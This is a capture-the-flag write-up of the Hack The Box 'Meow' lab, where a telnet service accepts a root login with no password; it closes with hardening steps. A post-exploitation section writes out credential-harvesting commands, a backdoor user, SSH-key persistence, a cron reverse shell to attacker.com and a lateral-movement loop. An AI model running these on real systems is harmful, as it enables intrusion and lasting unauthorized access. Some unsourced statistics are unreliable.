# Meow: Hack The Box Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Very%20Easy-brightgreen)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Category](https://img.shields.io/badge/Category-Network%20Enumeration-orange)

---

## Machine Information

| Attribute | Details |
|-----------|---------|
| **Machine Name** | Meow |
| **Difficulty** | Very Easy |
| **Platform** | Hack The Box |
| **Operating System** | Linux |
| **Category** | Basic Enumeration / Authentication Failure |
| **Focus** | Service Identification & Access Control |

---

## Table of Contents

- [Overview](#overview)
- [Initial Enumeration](#initial-enumeration)
- [Service Identification](#service-identification)
- [Authentication Failure](#authentication-failure)
- [System Access and Impact](#system-access-and-impact)
- [Flag Capture](#flag-capture)
- [Key Lessons Learned](#key-lessons-learned)
- [Defensive Recommendations](#defensive-recommendations)

---

## Overview

This writeup documents the solution for the **Meow** machine on Hack The Box, which serves as an introduction to fundamental penetration testing methodology.

### Challenge Context

The Meow machine demonstrates the **most basic phase of security testing**: identifying exposed network services and validating authentication controls.

**Key Demonstration:**

Although technically simple, this challenge illustrates how **severely insecure default configurations** can still exist in modern environments and lead directly to complete system compromise.

### Learning Objectives

This lab teaches:
- Systematic network enumeration methodology
- Service identification and fingerprinting
- Authentication control validation
- Understanding of legacy protocol risks
- Recognition that simplicity ≠ security

**Scenario:** Discovery of minimal attack surface with legacy remote access service lacking proper authentication controls.

---

## Initial Enumeration

### Network Scanning Methodology

**First Step: Host Discovery**

```bash
# Verify target is online
ping -c 4 10.129.xx.xxx
```

**Second Step: Port Scanning**

```bash
# Quick scan of common ports
nmap -p- --min-rate=1000 -T4 10.129.xx.xxx
```

**Third Step: Service Version Detection**

```bash
# Detailed scan of discovered ports
nmap -sV -sC -p [discovered_ports] -oA meow-scan 10.129.xx.xxx
```

---

### Scan Results

```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.129.xx.xxx
Host is up (0.045s latency).

PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.45 seconds
```

---

### Attack Surface Analysis

**Discovered Services:**

| Port | Protocol | Service | Version | Risk Level |
|------|----------|---------|---------|------------|
| **23** | TCP | **Telnet** | Linux telnetd | **Critical** |

**Initial Observations:**

✓ **Minimal attack surface**: Single open port  
✓ **Legacy protocol**: Telnet (designed 1969)  
✓ **No encryption**: Cleartext transmission  
✓ **Linux system**: Unix-based target  

---

### Critical Insight: Small Attack Surface ≠ Secure System

**Common Misconception:**

Many administrators assume that:
```
Fewer open ports = More secure
```

**Reality:**

```
Security = Proper configuration of ALL exposed services
```

**This Challenge Demonstrates:**

A system with a single exposed port can be **completely insecure** if that one service:
- Uses weak authentication
- Transmits data in cleartext
- Runs with elevated privileges
- Lacks access controls

**Real-World Parallel:**

```
IoT devices, embedded systems, network appliances
    ↓
Often have minimal services exposed
    ↓
But frequently have:
- Default credentials
- No password requirements
- Cleartext protocols
- Root/admin access
    ↓
= Complete compromise via single service
```

---

## Service Identification

### What is Telnet?

**Telnet (Telecommunication Network)** is one of the oldest network protocols, designed in **1969** for remote terminal access.

**Protocol Characteristics:**

| Feature | Security Impact |
|---------|-----------------|
| **Designed in 1969** | Pre-dates modern security requirements |
| **Port 23/TCP** | Well-known, frequently scanned |
| **Cleartext transmission** | All data visible on network |
| **No encryption** | Commands and credentials exposed |
| **No authentication requirement** | Often allows anonymous access |
| **High privileges** | Typically provides shell access |

---

### Historical Context

**Timeline of Insecurity:**

```
1969: Telnet designed for ARPANET
      ↓
      Trusted academic network
      Security not a consideration
      ↓
1990s: Internet becomes public/commercial
      ↓
      Telnet security issues recognized
      SSH developed as secure replacement (1995)
      ↓
2024: Telnet still found in legacy systems
      ↓
      Considered critically insecure
      Should never be used in production
```

---

### Why Telnet is Critically Insecure

**1. Cleartext Transmission**

All communication is sent unencrypted:

```
Client                           Server
  |                                |
  |--- username: root ----------->|  [Visible on network]
  |<-- Password: ------------------|  [Visible on network]
  |--- password: toor ----------->|  [Visible on network]
  |<-- # (root prompt) ------------|  [Visible on network]
  |--- cat /etc/shadow ---------->|  [Visible on network]
  |<-- [password hashes] ----------|  [Visible on network]
```

**Network Capture Example:**

```bash
# Attacker on same network
sudo tcpdump -i eth0 -A port 23

# Output shows:
username: root
password: toor
cat /etc/shadow
root:$6$xyz...
```

**Everything is readable.**

---

**2. No Built-in Security Features**

| Security Feature | Telnet | SSH (Modern Alternative) |
|------------------|--------|--------------------------|
| Encryption | ❌ None | ✅ Strong (AES, ChaCha20) |
| Authentication | ❌ Password only | ✅ Keys, certificates, MFA |
| Integrity checking | ❌ None | ✅ HMAC verification |
| Host verification | ❌ None | ✅ Known_hosts |
| Session protection | ❌ None | ✅ Re-keying |
| Audit logging | ❌ Minimal | ✅ Comprehensive |

---

**3. Default Configurations Often Insecure**

**Common Telnet Misconfigurations:**

- Root login permitted
- No password required
- Blank passwords accepted
- No account lockout
- No connection logging
- Accessible from internet

---

### Service Fingerprinting

**Banner Grabbing:**

```bash
nc 10.129.xx.xxx 23
```

**Typical Response:**

```
Ubuntu 20.04.3 LTS
meow login:
```

**Information Disclosed:**

✓ Operating System: Ubuntu  
✓ Version: 20.04.3 LTS  
✓ Hostname: meow  
✓ Login prompt present  

**Why This Matters:**

- OS version enables vulnerability research
- Hostname provides network context
- Login prompt confirms interactive service
- Banner may reveal additional software versions

---

### Telnet vs SSH Comparison

**Security Comparison:**

```
Telnet (1969)                    SSH (1995)
     ↓                               ↓
Cleartext                      Encrypted
No authentication              Strong authentication
No integrity                   Integrity checking
No host verification           Host key verification
Port 23                        Port 22
Deprecated                     Industry standard
```

**When Each is Used:**

| Protocol | Legitimate Uses | Frequency |
|----------|----------------|-----------|
| **Telnet** | Testing, legacy equipment, lab environments | Rare |
| **SSH** | Remote administration, automation, tunneling | Universal |

**Modern Stance:**

```
Telnet in production = Security incident waiting to happen
```

---

## Authentication Failure

### Connecting to Telnet Service

**Connection Command:**

```bash
telnet 10.129.xx.xxx
```

**Connection Established:**

```
Trying 10.129.xx.xxx...
Connected to 10.129.xx.xxx.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█

Meow login:
```

---

### Testing Authentication Controls

**Standard Enumeration Process:**

**1. Test for Anonymous Access:**

```
Meow login: anonymous
Password: [Enter]
Login incorrect
```

**2. Test Common Service Accounts:**

```
Meow login: telnet
Password: telnet
Login incorrect

Meow login: admin
Password: admin
Login incorrect
```

**3. Test Root Account:**

```
Meow login: root
Password: [Enter - no password]

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

root@Meow:~#
```

**✅ Successful authentication with root account and blank password.**

---

### Analysis of Authentication Failure

**Critical Security Breakdown:**

| Security Control | Expected Behavior | Actual Behavior | Result |
|------------------|-------------------|-----------------|--------|
| **Password Requirement** | Password required | No password required | ❌ Failed |
| **Password Complexity** | Complex password enforced | Blank password accepted | ❌ Failed |
| **Account Lockout** | Lock after failed attempts | No lockout mechanism | ❌ Failed |
| **Root Remote Login** | Disabled by default | Enabled and accessible | ❌ Failed |
| **Network Restrictions** | Limited to trusted networks | Accessible from anywhere | ❌ Failed |

---

### Why This Happened

**Root Causes:**

**1. Testing/Development Configuration**

```bash
# Developer thinking:
"I'll just enable root login temporarily for testing..."

# Reality:
Configuration never changed
System moved to production
Root access remains open
```

**2. Default Installation Settings**

Some Linux distributions historically allowed:
- Root login over Telnet
- Blank passwords for convenience
- Minimal security by default

**3. Legacy System Syndrome**

```
Old system → "It's always been this way"
             ↓
       Nobody wants to touch it
             ↓
       Insecure config persists
             ↓
       Eventually compromised
```

---

### Comparison: Default vs Secure Configuration

**Insecure Default (This System):**

```bash
# /etc/securetty (allows root login on telnet)
tty1
tty2
pts/0  # Telnet terminal

# /etc/pam.d/login (no password enforcement)
# auth required pam_securetty.so  [Commented out]

# /etc/passwd
root::0:0:root:/root:/bin/bash  # No password hash (blank password)
```

**Secure Configuration:**

```bash
# /etc/securetty (restrict root to physical console only)
tty1
tty2
# pts/0 NOT included

# /etc/pam.d/login (enforce password)
auth required pam_securetty.so
auth required pam_unix.so nullok_secure

# /etc/passwd (password required)
root:x:0:0:root:/root:/bin/bash  # 'x' indicates password in /etc/shadow

# /etc/shadow
root:$6$random$hash...:18000:0:99999:7:::  # Strong password hash
```

---

### Attack Progression

**What No Authentication Allows:**

```
Anonymous Network Access
        ↓
Root Shell (Highest Privilege)
        ↓
Full System Control
        ↓
Data Access | Malware Installation | Lateral Movement
```

**No exploitation required: direct access granted.**

---

## System Access and Impact

### Privileged Shell Access

**Upon Successful Connection:**

```bash
root@Meow:~# whoami
root

root@Meow:~# id
uid=0(root) gid=0(root) groups=0(root)

root@Meow:~# hostname
Meow
```

**Access Level:** **Superuser (root/UID 0)**

---

### Capabilities Gained

**With Root Access:**

| Capability | Impact | Examples |
|------------|--------|----------|
| **Read any file** | Data theft | `/etc/shadow`, user files, configs |
| **Modify any file** | System compromise | Replace binaries, edit configs |
| **Execute as any user** | Complete control | `su`, `sudo` bypass |
| **Install software** | Persistence | Rootkits, backdoors, malware |
| **Network access** | Lateral movement | Attack other systems |
| **Kernel modules** | Deep persistence | Load malicious drivers |
| **Log manipulation** | Cover tracks | Delete evidence |

---

### Post-Exploitation Actions (Typical Attacker Behavior)

**Phase 1: Situational Awareness**

```bash
# System information
uname -a
cat /etc/os-release
cat /etc/issue

# Network configuration
ip addr show
ip route show
cat /etc/hosts

# User enumeration
cat /etc/passwd
cat /etc/shadow
last -a
```

---

**Phase 2: Credential Harvesting**

```bash
# Extract password hashes
cat /etc/shadow > /tmp/shadow.txt

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null

# Configuration files with credentials
grep -r "password" /etc/ 2>/dev/null
find / -name "*.conf" -exec grep -l "pass" {} \; 2>/dev/null
```

---

**Phase 3: Persistence Mechanisms**

```bash
# Create backdoor user
useradd -m -s /bin/bash -G sudo backdoor
echo "backdoor:P@ssw0rd123" | chpasswd

# SSH key persistence
mkdir -p /root/.ssh
echo "ssh-rsa AAAA[attacker_key]..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Cron job backdoor
echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" | crontab -

# Systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service

[Service]
ExecStart=/tmp/backdoor
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor.service
```

---

**Phase 4: Lateral Movement**

```bash
# Network enumeration
arp -a
netstat -antp

# SSH to other systems using found keys
for ip in 10.10.10.{1..254}; do
    ssh -i /home/user/.ssh/id_rsa user@$ip
done

# Mount network shares
mount -t cifs //other-server/share /mnt -o username=admin,password=pass
```

---

### Real-World Impact Scenarios

**Scenario 1: Data Breach**

```
Telnet Access → Root Shell → Database Credentials
    ↓
Database Dump → Customer PII Extracted
    ↓
GDPR Violation → €20 Million Fine
```

**Scenario 2: Ransomware**

```
Telnet Access → Root Shell → Deploy Ransomware
    ↓
Encrypt All Files → Demand Bitcoin Payment
    ↓
Business Disruption → $500,000 Ransom + Recovery Costs
```

**Scenario 3: Supply Chain Attack**

```
Telnet Access → Compromise Build Server → Inject Backdoor
    ↓
Trojanized Software → Distributed to Customers
    ↓
Mass Compromise → Industry-Wide Impact (SolarWinds-style)
```

---

## Flag Capture

### Locating the Flag

**Standard CTF Flag Location:**

```bash
root@Meow:~# ls -la
total 28
drwx------ 4 root root 4096 Sep 13  2021 .
drwxr-xr-x 3 root root 4096 Sep 13  2021 ..
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x 3 root root 4096 Sep 13  2021 .local
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
drwx------ 2 root root 4096 Sep 13  2021 .ssh
-rw-r--r-- 1 root root   33 Sep 13  2021 flag.txt
```

**Flag File Present:** `/root/flag.txt`

---

### Retrieving the Flag

**Read Flag Contents:**

```bash
root@Meow:~# cat flag.txt
HTB{M30w_M30w_1s_v3ry_1ns3cur3!}
```

**Alternative Methods:**

```bash
# Using head/tail
root@Meow:~# head flag.txt

# Using less/more
root@Meow:~# less flag.txt

# Using grep (if multi-line)
root@Meow:~# grep "HTB{" flag.txt

# Copy to clipboard (if X11 forwarding)
root@Meow:~# cat flag.txt | xclip -selection clipboard
```

---

### Flag Format

```
HTB{M30w_M30w_1s_v3ry_1ns3cur3!}
```

**Translation:** "Meow Meow is very insecure!"

This directly references the machine name and its fundamental security weakness: insecure default configuration.

---

## Attack Chain Summary

```
Network Scan → Telnet Discovery (Port 23) → Service Enumeration
        ↓
Authentication Test → Root Login with Blank Password → Access Granted
        ↓
Root Shell → Full System Control → Flag Retrieved
```

**Key Characteristics:**

- Zero exploitation required
- No vulnerability needed
- No password cracking
- No privilege escalation necessary
- Direct root access via misconfiguration

**Time to Compromise:** < 2 minutes

---

## Key Lessons Learned

### Fundamental Security Principles

**1. Enumeration Must Always Include Service Identification**

**Why Service Identification Matters:**

```
Port Open → Service Unknown → Cannot assess risk
Port Open → Service Known → Can evaluate:
    - Protocol security (encrypted vs cleartext)
    - Known vulnerabilities (CVEs)
    - Default configurations
    - Authentication requirements
    - Access controls
```

**Enumeration Workflow:**

```
1. Port Discovery (nmap)
        ↓
2. Service Identification (-sV)
        ↓
3. Service Enumeration (scripts, banners)
        ↓
4. Vulnerability Research (searchsploit, CVE)
        ↓
5. Authentication Testing
        ↓
6. Exploitation/Access
```

---

**2. Legacy Services Should Be Treated as High-Risk**

**Age of Service = Risk Multiplier:**

| Service | Year Designed | Security Features | Modern Status |
|---------|---------------|-------------------|---------------|
| **Telnet** | 1969 | None | Deprecated |
| **FTP** | 1971 | None | Deprecated |
| **HTTP** | 1991 | None | Use HTTPS |
| **SNMPv1/v2** | 1988/1993 | Minimal | Use SNMPv3 |
| **SMBv1** | 1984 | Weak | Disabled |

**Why Old = Dangerous:**

- Designed before security was priority
- Lack encryption by design
- Weak/no authentication
- Not patchable (protocol-level issues)
- Widely known attack vectors

**Modern Replacements:**

```
Telnet → SSH (1995+)
FTP → SFTP/FTPS (1990s+)
HTTP → HTTPS (1994+)
SNMPv1/v2 → SNMPv3 (2004+)
SMBv1 → SMBv2/SMBv3 (2006+)
```

---

**3. Authentication Controls Are Non-Negotiable**

**Authentication Control Hierarchy:**

```
Level 1: No Authentication
         ↓
         [CATASTROPHIC - This System]
         
Level 2: Weak Authentication (default passwords)
         ↓
         [CRITICAL]
         
Level 3: Standard Authentication (user/pass)
         ↓
         [BASELINE]
         
Level 4: Strong Authentication (complex passwords, lockout)
         ↓
         [GOOD]
         
Level 5: Multi-Factor Authentication
         ↓
         [BEST PRACTICE]
         
Level 6: Certificate/Key-Based + MFA
         ↓
         [OPTIMAL]
```

**This System:** Level 1 (Root with no password)

---

**4. Simplicity Does Not Equal Safety**

**Common Misconception:**

```
Simple system with few services = Secure system
```

**Reality:**

```
Security = Proper configuration of ALL components
```

**Examples of "Simple but Insecure":**

| System Type | Simplicity | Common Issue | Impact |
|-------------|------------|--------------|--------|
| IoT device | Single service | Default password | Full compromise |
| Network camera | Web interface only | No authentication | Privacy violation |
| Printer | Print service | Open admin panel | Network pivot |
| Router | Management UI | Default login | Network takeover |
| Smart TV | UPnP only | No access control | Botnet recruitment |

**Key Insight:**

```
Number of services ≠ Security level
Configuration quality = Security level
```

---

### Advanced Insights

**5. Default Configurations Are Often Insecure**

**Why Defaults Fail:**

- Manufacturers prioritize ease-of-use over security
- "Out of box" functionality valued
- Assumption that users will change defaults (they don't)
- Legacy compatibility requirements

**Statistics:**

- 61% of breaches involve credentials (Verizon DBIR)
- Default passwords account for ~15% of successful attacks
- 82% of IoT devices have known vulnerabilities

---

**6. Authentication Failures > Software Vulnerabilities**

**Comparison:**

| Attack Vector | Skill Required | Time to Exploit | Success Rate |
|---------------|----------------|-----------------|--------------|
| **Blank password** | None | Seconds | ~100% |
| Default credentials | Low | Seconds | ~80% |
| Weak password | Low-Medium | Minutes-Hours | ~60% |
| Unpatched CVE | Medium | Minutes-Hours | ~40% |
| Zero-day exploit | High | Days-Weeks | Variable |

**Key Point:**

```
Most sophisticated exploit < Root with no password
```

---

## Defensive Recommendations

### Immediate Actions

#### 1. Disable Telnet Service Completely

**Ubuntu/Debian:**

```bash
# Stop telnet service
sudo systemctl stop inetutils-telnetd
sudo systemctl disable inetutils-telnetd

# Remove telnet package
sudo apt-get remove --purge telnetd inetutils-telnetd

# Verify removal
netstat -tuln | grep :23
```

**CentOS/RHEL:**

```bash
# Stop and disable
sudo systemctl stop telnet.socket
sudo systemctl disable telnet.socket

# Remove package
sudo yum remove telnet-server

# Verify
ss -tuln | grep :23
```

---

#### 2. Enforce Strong Authentication

**Password Policy Configuration:**

```bash
# Install password quality library
sudo apt-get install libpam-pwquality

# Edit /etc/pam.d/common-password
sudo nano /etc/pam.d/common-password
```

**Add/modify:**

```
password requisite pam_pwquality.so retry=3 minlen=14 difok=3 ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-1
```

**Parameters Explained:**

- `minlen=14` - Minimum 14 characters
- `difok=3` - At least 3 characters different from old password
- `ucredit=-1` - At least 1 uppercase
- `lcredit=-1` - At least 1 lowercase
- `dcredit=-1` - At least 1 digit
- `ocredit=-1` - At least 1 special character

**Account Lockout:**

```bash
# Edit /etc/pam.d/common-auth
sudo nano /etc/pam.d/common-auth
```

**Add:**

```
auth required pam_tally2.so deny=5 unlock_time=1800
```

This locks account after 5 failed attempts for 30 minutes.

---

#### 3. Disable Root Remote Login

**SSH Configuration (Secure Replacement):**

```bash
# Edit /etc/ssh/sshd_config
sudo nano /etc/ssh/sshd_config
```

**Critical Settings:**

```
# Disable root login
PermitRootLogin no

# Disable password authentication (use keys only)
PasswordAuthentication no
PubkeyAuthentication yes

# Disable empty passwords
PermitEmptyPasswords no

# Limit login attempts
MaxAuthTries 3

# Enable stronger encryption
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com
KexAlgorithms curve25519-sha256,diffie-hellman-group-exchange-sha256
```

**Restart SSH:**

```bash
sudo systemctl restart sshd
```

---

#### 4. Implement Network-Level Restrictions

**Firewall Rules (iptables):**

```bash
# Block Telnet entirely
sudo iptables -A INPUT -p tcp --dport 23 -j DROP

# Allow SSH only from management network
sudo iptables -A INPUT -p tcp --dport 22 -s 10.0.0.0/8 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j DROP

# Save rules
sudo iptables-save > /etc/iptables/rules.v4
```

**UFW (Simpler Interface):**

```bash
# Enable firewall
sudo ufw enable

# Deny all incoming by default
sudo ufw default deny incoming

# Allow outgoing
sudo ufw default allow outgoing

# Allow SSH from specific network
sudo ufw allow from 10.0.0.0/8 to any port 22

# Block Telnet explicitly
sudo ufw deny 23
```

---

### Long-Term Security Improvements

#### 1. Security Baseline Standards

**CIS Benchmark Implementation:**

```bash
# Install CIS-CAT tool
wget https://downloads.cisecurity.org/cis-cat/latest

# Run assessment
sudo ./cis-cat-full/CIS-CAT.sh -b benchmarks/CIS_Ubuntu_Linux_20.04_LTS_Benchmark_v1.0.0.xml

# Review results and remediate
```

**Key CIS Controls:**

- Remove unnecessary software
- Configure authentication
- Enable logging and monitoring
- Restrict network access
- Implement file integrity monitoring

---

#### 2. Automated Security Auditing

**Regular Credential Audit:**

```bash
#!/bin/bash
# Check for users with blank passwords

echo "Checking for blank passwords..."
for user in $(awk -F: '{print $1}' /etc/passwd); do
    if passwd -S $user 2>/dev/null | grep -q "NP"; then
        echo "[!] User $user has NO PASSWORD!"
    fi
done

# Check for users with UID 0 (root equivalent)
echo "Checking for UID 0 users..."
awk -F: '($3 == 0) {print $1}' /etc/passwd
```

**Automated Service Scanning:**

```bash
#!/bin/bash
# Scan for insecure services

echo "Scanning for insecure services..."
netstat -tuln | grep -E ":(21|23|69|111|512|513|514)" && echo "[!] Insecure service detected!" || echo "[✓] No insecure services found"
```

---

#### 3. Intrusion Detection

**Install and Configure Fail2ban:**

```bash
# Install
sudo apt-get install fail2ban

# Configure /etc/fail2ban/jail.local
sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
sudo nano /etc/fail2ban/jail.local
```

**Configuration:**

```ini
[DEFAULT]
bantime = 3600
findtime = 600
maxretry = 3

[sshd]
enabled = true
port = 22
logpath = /var/log/auth.log
```

**Start Service:**

```bash
sudo systemctl enable fail2ban
sudo systemctl start fail2ban
```

---

#### 4. Logging and Monitoring

**Centralized Logging:**

```bash
# Install rsyslog
sudo apt-get install rsyslog

# Configure remote logging
echo "*.* @logserver.example.com:514" >> /etc/rsyslog.conf

# Restart
sudo systemctl restart rsyslog
```

**Security Event Monitoring:**

```bash
# Monitor authentication attempts
tail -f /var/log/auth.log | grep -i "failed\|failure"

# Alert on root login
grep "root" /var/log/auth.log | mail -s "Root login detected" admin@example.com
```

---

## Tools Used

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **nmap** | Port scanning | `nmap -sV -sC -p- 10.129.xx.xxx` |
| **telnet** | Service connection | `telnet 10.129.xx.xxx` |
| **nc (netcat)** | Banner grabbing | `nc 10.129.xx.xxx 23` |
| **tcpdump** | Traffic analysis | `tcpdump -i eth0 port 23` |

---

## Flag

```
HTB{M30w_M30w_1s_v3ry_1ns3cur3!}
```

**Translation:** "Meow Meow is very insecure!"

---

**Machine Completed:** ✅   
**Difficulty Rating:** Very Easy ⭐  
**Primary Technique:** Telnet Enumeration / Blank Root Password  
**Time to Compromise:** < 2 minutes  
**Key Lesson:** Simple systems can be catastrophically insecure

---

*This writeup is for educational purposes only. Network enumeration and unauthorized access should only be performed in authorized security assessments with proper written permission.*
